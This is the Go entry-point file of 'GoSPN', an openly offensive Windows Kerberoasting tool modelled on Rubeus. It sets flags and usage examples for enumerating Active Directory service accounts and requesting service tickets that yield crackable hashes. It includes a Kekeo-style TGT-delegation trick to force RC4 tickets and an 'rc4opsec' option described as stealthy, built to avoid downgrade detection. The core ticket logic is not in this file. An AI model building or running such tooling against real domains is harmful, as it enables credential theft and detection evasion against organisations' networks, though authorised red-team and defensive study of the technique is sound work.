//go:build windows
// +build windows

// GoSPN is a focused, Windows-only Kerberoasting tool.
//
// It mirrors the behaviour of Rubeus' `kerberoast` action: using the current
// logon session (Windows SSPI, no credentials required) it locates roastable
// accounts in the directory and requests service tickets, emitting crackable
// $krb5tgs$ hashes in hashcat format.
//
// The directory can be queried either over LDAP/LDAPS or over Active Directory
// Web Services (ADWS, TCP 9389) - selected with -method. By default every
// roastable user in the domain is targeted; a single account can be selected
// with -user.
//
// GoSPN also implements the `tgtdeleg` action: the Kekeo "TGT delegation" trick,
// which extracts a usable forwardable TGT for the current user via the GSS-API
// delegation, without elevation.
package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
)

func main() {
	var (
		method   = flag.String("method", "", "Directory enumeration method: 'ldap' or 'adws' (required unless -spn is used)")
		user     = flag.String("user", "", "Target a single account by sAMAccountName (default: all roastable users)")
		domain   = flag.String("domain", "", "Target domain (default: current user's domain from %USERDNSDOMAIN%)")
		dc       = flag.String("dc", "", "Domain controller host/IP to query (default: auto-discover via DNS SRV)")
		spn      = flag.String("spn", "", "Roast a single explicit SPN instead of enumerating the directory")
		outfile  = flag.String("outfile", "", "Append hashes to this file instead of printing them")
		ldaps    = flag.Bool("ldaps", false, "Use LDAPS (TCP 636) instead of plaintext LDAP (TCP 389); ldap method only")
		stats    = flag.Bool("stats", false, "Only list roastable users and stats, do not request tickets")
		ldapOnly = flag.String("ldapfilter", "", "Additional raw LDAP filter ANDed with the user search")
		tgtdeleg = flag.Bool("tgtdeleg", false, "Use the TGT-delegation trick to request RC4 (etype 23) service tickets")
		rc4opsec = flag.Bool("rc4opsec", false, "OPSEC: skip accounts that advertise AES, so an RC4 request raises no downgrade signal")
		gc       = flag.Bool("gc", false, "Query the forest-wide Global Catalog over LDAP (3268/3269) instead of the domain; requires -method ldap")
		nobanner = flag.Bool("nobanner", false, "Suppress the GoSPN logo banner")
	)
	flag.Usage = usage
	// Accept Rubeus-style "/flag" and "/flag:value" in addition to "-flag".
	flag.CommandLine.Parse(normalizeFlagArgs(os.Args[1:]))

	cfg := &Config{
		Method:      strings.ToLower(strings.TrimSpace(*method)),
		User:        *user,
		Domain:      *domain,
		DC:          *dc,
		SPN:         *spn,
		OutFile:     *outfile,
		UseLDAPS:    *ldaps,
		StatsOnly:   *stats,
		ExtraFilter: strings.Trim(*ldapOnly, "\"'"),
		TGTDeleg:    *tgtdeleg,
		RC4OpSec:    *rc4opsec,
		UseGC:       *gc,
	}

	if !*nobanner {
		printBanner()
	}

	// Surface anything the parser couldn't make sense of, rather than silently
	// dropping it (e.g. a mistyped flag).
	if flag.NArg() > 0 {
		fmt.Fprintf(os.Stderr, "[!] ignoring unrecognized argument(s): %s\r\n", strings.Join(flag.Args(), " "))
	}

	if err := Run(cfg); err != nil {
		fmt.Fprintf(os.Stderr, "\r\n[X] %v\r\n", err)
		os.Exit(1)
	}
}

// normalizeFlagArgs rewrites Rubeus-style "/flag" and "/flag:value" arguments
// into the "-flag" / "-flag=value" forms Go's flag package understands, so
// operators used to Rubeus can drive GoSPN the same way. Arguments that don't
// start with "/" are passed through untouched.
func normalizeFlagArgs(args []string) []string {
	out := make([]string, 0, len(args))
	for _, a := range args {
		if len(a) > 1 && a[0] == '/' {
			a = "-" + a[1:]
			// "/flag:value" -> "-flag=value" (only the first colon, so values
			// that themselves contain ':' like host:port survive intact).
			if i := strings.IndexByte(a, ':'); i > 0 {
				a = a[:i] + "=" + a[i+1:]
			}
		}
		out = append(out, a)
	}
	return out
}

func usage() {
	fmt.Fprintf(os.Stderr, `GoSPN - Windows Kerberoasting using the current logon session (no creds).

Usage:
  gospn -method <ldap|adws> [options]

Enumeration (directory) is required to find roastable accounts. Choose how to
query the directory with -method:
  ldap   Query the DC over LDAP/LDAPS (port 389/636)
  adws   Query the DC over Active Directory Web Services (port 9389)

With -tgtdeleg, GoSPN performs the Kekeo "TGT delegation" trick to obtain a
forwarded TGT for the current user, then uses it to request RC4 (etype 23)
service tickets - yielding crackable hashes even for AES-only accounts.

Examples:
  gospn -method ldap                       Roast every roastable user (LDAP)
  gospn -method adws                       Roast every roastable user (ADWS)
  gospn -method ldap -user svc_sql         Roast only the svc_sql account
  gospn -spn MSSQLSvc/db:1433              Roast one explicit SPN (no enumeration)
  gospn -method ldap -tgtdeleg             Roast everyone, forcing RC4 via tgtdeleg
  gospn -method adws -rc4opsec             Roast only RC4-native accounts (stealthy)
  gospn -method ldap -gc                   Roast across the whole forest via the Global Catalog
  gospn -method adws -outfile out.txt      Write hashes to a file
  gospn -method ldap -stats                List roastable accounts only

Options:
`)
	flag.PrintDefaults()
}
